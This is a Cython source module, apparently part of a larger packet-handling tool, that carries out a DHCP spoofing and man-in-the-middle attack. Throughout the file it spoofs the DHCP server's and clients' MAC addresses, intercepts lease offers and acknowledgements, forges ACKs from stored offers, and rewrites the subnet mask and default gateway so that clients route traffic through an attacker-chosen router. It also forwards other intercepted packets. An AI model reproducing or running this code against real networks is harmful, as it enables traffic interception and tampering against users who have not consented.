import binascii
import copy
import multiprocessing
import time
import traceback

from IncommingPacketHandler cimport *
from network_layers.Packet cimport *
from utils.Utils cimport *
from utils.Parser cimport *
from network_layers.DhcpLayer cimport *



# local dict with transaction id to state object assignments.
# If multiple packet handlers are required, make this dict shared.
dhcp_handler_states = dict()

# mac of the dhcp server (set from inds.py)
dhcp_server_mac = 0
# new mask and gateway (set from inds.py)
new_subn_mask = 0
new_router = 0


cdef void change_subnet_mask_option(Packet packet, unsigned int new_mask):

    """
    Changes the subnet option of the dhcp layer to new_mask value.
    
    :param packet: Reference to a packet, that should be changed.
    :param new_mask: Value for new subnet mask.
    :return: Void.
    """

    for option in packet.dhcp_layer.options:
        # if found subnet mask option, break
        option_loc = <dhcp_option>option

        if option_loc.option == DhcpOptionTypes.SUBNET_MASK:
            # found netmask option
            #TODO debug
            print('NEW MASK ', new_mask)
            new_bytes_mask = convert_int_to_bytes(4, new_mask)
            packet.packet_data[option_loc.option_start + 2 : option_loc.option_end] = new_bytes_mask
            return

cdef void change_default_gateway_option(Packet packet, unsigned int new_gateway):

    """
    Changes the router option of the dhcp layer to new_gateway value.
    ASSUMPTION: ONLY ONE ROUTER!!!
    
    :param packet: Reference to a packet, that should be changed.
    :param new_gateway: Value for new gateway.
    :return: Void.
    """

    for option in packet.dhcp_layer.options:
        # if found gateway option, break
        option_loc = <dhcp_option>option

        if option_loc.option == DhcpOptionTypes.ROUTER:
            # ASSUMPTION: ONLY ONE ROUTER IN FIELD
            # found router option
            new_bytes_gateway = convert_int_to_bytes(4, new_gateway)
            packet.packet_data[option_loc.option_start + 2 : option_loc.option_end] = new_bytes_gateway
            return

cdef void start_spoofing_dhcp_server(macs_to_spoof_list):
    """
    Starts spoofing of the dhcp server by adding its mac to the MacsToSpoof set.
    :return: Void.
    """
    if dhcp_server_mac in macs_to_spoof_list:
        return
    macs_to_spoof_list.append(dhcp_server_mac)

cdef void stop_spoofing_dhcp_server(macs_to_spoof_list):
    """
    Stops spoofing of the dhcp server by removing its mac from the MacsToSpoof set.
    :return: Void.
    """
    if dhcp_server_mac in macs_to_spoof_list:
        macs_to_spoof_list.remove(dhcp_server_mac)
    return

cdef class DhcpHandlerState:

    """
    Class, that stores the state of a particular dhcp connection.
    """

    def __cinit__(self):
        self.state = DhcpHandlerStates.INIT
        self.offer_packet = None


cdef void dhcp_packet_handler(Packet packet, DhcpHandlerState state, write_queue, macs_to_spoof_list, ip_to_mac_assignments):

    """
    Function, that handles a dhcp connection.
    
    :param packet: Currently received packet, that should be handled.
    :param state: Object with saved state for a particular transaction id.
    :param write_queue: Shared multiprocessing.Manager().Queue() for packets to send.
    :param macs_to_spoof_list: Shared list with macs, that need to be spoofed.
    :param ip_to_mac_assignments: Shared dict, with mac address to ip assignments. (mac is key, ip is value)
    :return: Void
    """

    # cast to DhcpHandlerState (without, does not work)
    state = <DhcpHandlerState>state

    if state.state == DhcpHandlerStates.INIT:

        # either a completely new client, or a client is just renewing its lease
        # if this is a reply (lost packet), just ignore it
        if packet.dhcp_layer.fields.opcode == bootp_opcodes.BOOTP_REPLY:
            state.state = DhcpHandlerStates.ERROR
            print('Received reply for no request, drop connection.')
            return

        # ASSUMPTION: the dhcp optio 53 (message type) is always the first option in the list
        try:
            # if bootp request
            # if unicast request
            if (packet.packet_data[(<dhcp_option>(packet.dhcp_layer.options[0])).option_start+ 2]) == dhcp_option_msg_type_values.REQUEST and\
                    packet.ethernet_layer.fields.dst_mac != 0xffffffffffff:

                state.state = DhcpHandlerStates.RENEWAL_CLIENT_SENT_REQUEST

            # if discover
            if (packet.packet_data[(<dhcp_option>(packet.dhcp_layer.options[0])).option_start+ 2]) == dhcp_option_msg_type_values.DISCOVER:
                state.state = DhcpHandlerStates.INIT_CONNECTION_RECEIVED_DISCOVER


        except Exception as ex:
            traceback.print_exc()
            # an error occurred (option not present, ...)
            state.state = DhcpHandlerStates.ERROR
            print('The dhcp packet with id 0x{0} has no option 53 (opcode) field. Can not handle it.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
            return

    if state.state == DhcpHandlerStates.RENEWAL_CLIENT_SENT_REQUEST:
        print("Received DHCP request with transaction id {0}".format(hex(packet.dhcp_layer.fields.transaction_id)))
        # start spoofing clients mac
        if packet.ethernet_layer.fields.src_mac not in macs_to_spoof_list:
            macs_to_spoof_list.append(packet.ethernet_layer.fields.src_mac)

        # stop spoofing server
        stop_spoofing_dhcp_server(macs_to_spoof_list)

        # add packet to sending queue
        write_queue.put(packet)
        state.state = DhcpHandlerStates.RENEWAL_FORWARDED_REQUEST_TO_SERVER

    if state.state == DhcpHandlerStates.RENEWAL_FORWARDED_REQUEST_TO_SERVER:

        print('Forwarded request to server for transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
        # start spoofing server again, after a short timeout
        time.sleep(0.001)
        start_spoofing_dhcp_server(macs_to_spoof_list)
        state.state = DhcpHandlerStates.RENEWAL_WAITING_FOR_ACK_FROM_SERVER
        # return and wait for an acp packet
        return

    if state.state == DhcpHandlerStates.RENEWAL_WAITING_FOR_ACK_FROM_SERVER:

        # hopefully received ack from server
        # if nack, or other error type, skip
        if (packet.packet_data[(<dhcp_option>(packet.dhcp_layer.options[0])).option_start+ 2]) != dhcp_option_msg_type_values.ACK:
            state.state = DhcpHandlerStates.ERROR
            return
        # if it is an ack
        print('Received ack for transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
        state.state = DhcpHandlerStates.RENEWAL_MODIFYING_ACK_FROM_SERVER

    if state.state == DhcpHandlerStates.RENEWAL_MODIFYING_ACK_FROM_SERVER:

        # Change subnet mask
        change_subnet_mask_option(packet, new_subn_mask)

        # Change default gateway
        change_default_gateway_option(packet, new_router)

        # compute new udp checksum
        packet.packet_data[packet.udp_layer.fields.checksum_start : packet.udp_layer.fields.checksum_end] = convert_int_to_bytes(2, calculate_udp_checksum(packet))

        state.state = DhcpHandlerStates.RENEWAL_SENT_ACK_TO_CLIENT

    if state.state == DhcpHandlerStates.RENEWAL_SENT_ACK_TO_CLIENT:
        print('Forwarded ack to client for transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
        # stop spoofing client mac
        if packet.ethernet_layer.fields.dst_mac in macs_to_spoof_list:
            macs_to_spoof_list.remove(packet.ethernet_layer.fields.dst_mac)
        # add modified packet to sending queue
        write_queue.put(packet)

        # set state to error because this "transaction" should be deleted (it is completed)
        state.state = DhcpHandlerStates.ERROR



    ### Initial connection (discover, offer, request, reply)
    # It heavily depends on user hard and software.
    # This implementation is for the case, when all packets of this phase are sent via broadcast.
    if state.state == DhcpHandlerStates.INIT_CONNECTION_RECEIVED_DISCOVER:
        print('Received dhcp discovery with transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
        # wait for an offer
        state.state = DhcpHandlerStates.INIT_CONNECTION_WAITING_FOR_OFFER
        return

    if state.state == DhcpHandlerStates.INIT_CONNECTION_WAITING_FOR_OFFER:

        # if received packet is offer, continue
        # else, discard connection
        try:
            # if offer
            if (packet.packet_data[(<dhcp_option>(packet.dhcp_layer.options[0])).option_start+ 2]) == dhcp_option_msg_type_values.OFFER:
                state.state = DhcpHandlerStates.INIT_CONNECTION_RECEIVED_OFFER
                print('Received offer for transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))

        except Exception as ex:
            traceback.print_exc()
            # an error occurred (option not present, ...)
            state.state = DhcpHandlerStates.ERROR
            print('The dhcp packet has no option 53 (opcode) field. Can not handle it.')
            return

    if state.state == DhcpHandlerStates.INIT_CONNECTION_RECEIVED_OFFER:
        # store offer and wait for request
        # if request received, send offer with modified type field --> will be an ack
        state.offer_packet = packet
        state.state = DhcpHandlerStates.INIT_CONNECTION_WAITING_FOR_REQUEST
        return

    if state.state == DhcpHandlerStates.INIT_CONNECTION_WAITING_FOR_REQUEST:
        # if received packet is request, continue
        # else, discard connection
        try:
            # if request
            if (packet.packet_data[(<dhcp_option>(packet.dhcp_layer.options[0])).option_start+ 2]) == dhcp_option_msg_type_values.REQUEST:
                state.state = DhcpHandlerStates.INIT_CONNECTION_RECEIVED_REQUEST
                print('Received request for transaction id {0}.'.format(hex(packet.dhcp_layer.fields.transaction_id)))
        except Exception as ex:
            traceback.print_exc()
            print(ex)
            # an error occurred (option not present, ...)
            state.state = DhcpHandlerStates.ERROR
            print('The dhcp packet has no option 53 (opcode) field. Can not handle it.')
            return

    if state.state == DhcpHandlerStates.INIT_CONNECTION_RECEIVED_REQUEST:

        # change type of packet from offer to ack in the stored offer packet
        # send modified packet as ack
        try:
            # change packet type
            #state.offer_packet.packet_data[(convert_bytes_to_uint((<dhcp_option>(packet.dhcp_layer.options[0])).option_start + 2))] = dhcp_option_msg_type_values.ACK
            state.offer_packet.packet_data[((<dhcp_option>(packet.dhcp_layer.options[0])).option_start + 2)] = 5

            #modify packet
            # Change subnet mask
            change_subnet_mask_option(state.offer_packet, new_subn_mask)

            # Change default gateway
            change_default_gateway_option(state.offer_packet, new_router)

            # compute new udp checksum
            state.offer_packet.packet_data[state.offer_packet.udp_layer.fields.checksum_start : state.offer_packet.udp_layer.fields.checksum_end] = convert_int_to_bytes(2, calculate_udp_checksum(state.offer_packet))

            # send packet
            write_queue.put(state.offer_packet)
            state.state = DhcpHandlerStates.INIT_CONNECTION_SENT_ACK
        except Exception as ex:
            traceback.print_exc()
            # an error occurred while modifying packet
            state.state = DhcpHandlerStates.ERROR
            print('Could not change type of packet from offer to ack.')
            return

    if state.state == DhcpHandlerStates.INIT_CONNECTION_SENT_ACK:

        # clients are suspicious
        # sometimes they send multiple requests if they receive more, than one ack
        # set state to waiting for request and do all steps again, if a request from the same client (same transaction id)
        # is received
        # If the client sends a request with a new sequence id it becomes complicated, because complicated mac address assignments
        # must be carried out. NOT YET IMPLEMENTED (but could be... :)  )
        state.state = DhcpHandlerStates.INIT_CONNECTION_WAITING_FOR_REQUEST

        # here should be some sort of timeout to delete old connections, but..... not yet implemented :)
        return


cdef void dhcp_packet_handler_manager(Packet packet, write_queue, macs_to_spoof_list, ip_to_mac_assignments):
    
    """
    Based on the transaction id of the packet determines to which "transaction" (what DhcpHandlerState to use)
    the packet belongs to.
    
    :param packet: A dhcp packet, that should be handled.
    :param write_queue: Shared multiprocessing.Manager().Queue() for packets, that should be sent.
    :param macs_to_spoof_list: Shared list with macs, that need to be spoofed.
    :param ip_to_mac_assignments: Shared dict, with mac address to ip assignments. (mac is key, ip is value)
    :return: Void.
    """


    # get transaction id
    cdef unsigned long transaction_id = packet.dhcp_layer.fields.transaction_id

    print("Received a DHCP packet with transaction id {}".format(hex(transaction_id)))

    if not (transaction_id in dhcp_handler_states):
        # create new handler object
        dhcp_handler_states[transaction_id] = DhcpHandlerState()

    # invoke handler
    dhcp_packet_handler(packet, dhcp_handler_states.get(transaction_id), write_queue, macs_to_spoof_list, ip_to_mac_assignments)

    # check, if error occurred and remove this element
    if (<DhcpHandlerState>dhcp_handler_states.get(transaction_id)).state == DhcpHandlerStates.ERROR:
        dhcp_handler_states.pop(transaction_id)
        print('Terminated transaction {}.'.format(hex(transaction_id)))



cpdef void packet_handler(write_queue, parsed_queue, unsigned int handler_nr, macs_to_spoof_list, ip_to_mac_assignments):

    """
    Does initial packet handling.
    Determines the type of the packet and then either forwards it to the dhcp_packet_handler_manager,
    or drops it, if it is a broadcast packet,
    or forwards it (puts into the write_queue).
    
    :param write_queue: Shared multiprocessing.Manager().Queue() for packets, that should be sent
    :param parsed_queue: Shared multiprocessing.Manager().Queue() with parsed packets
    :param handler_nr: handler id (to distinguish handlers in logs / output)
    :param macs_to_spoof_list: Shared list with macs, that need to be spoofed.
    :param ip_to_mac_assignments: Shared dict, with mac address to ip assignments. (mac is key, ip is value)
    :return: Void
    """

    print("Started handler {0:d}.".format(handler_nr))

    cdef Packet packet
    while True:
        try:
            packet = parsed_queue.get(timeout = 100)

            # if exists and is not broadcast put mac to ip assignment into the ip_to_mac_assignments dict
            if (packet.ethernet_layer.fields.dst_mac != 0xffffffffffff) and \
                    (packet.ipv4_layer is not None) and \
                    (packet.ipv4_layer.fields.dest_ip != 0xffffffff):
                ip_to_mac_assignments[packet.ethernet_layer.fields.dst_mac] = packet.ipv4_layer.fields.dest_ip
                # add source mac and ip to ip_to_mac_assignments dict
                if (packet.ipv4_layer is not None):
                    ip_to_mac_assignments[packet.ethernet_layer.fields.src_mac] = packet.ipv4_layer.fields.source_ip

            # if type dhcp, handle it
            if packet.dhcp_layer is not None:
                dhcp_packet_handler_manager(packet, write_queue, macs_to_spoof_list, ip_to_mac_assignments)
                continue

            # if broadcast packet, drop
            if packet.ethernet_layer.fields.dst_mac == 0xffffffffffff:
                continue

            # if arp packet, drop
            if packet.arp_layer != None:
                continue

            # if other type, forward to recipient
            write_queue.put(packet)

        except:
            # If the timeout is reached, but the queue remains empty,
            # an exception is thrown.
            # If this happens just continue to poll.
            continue


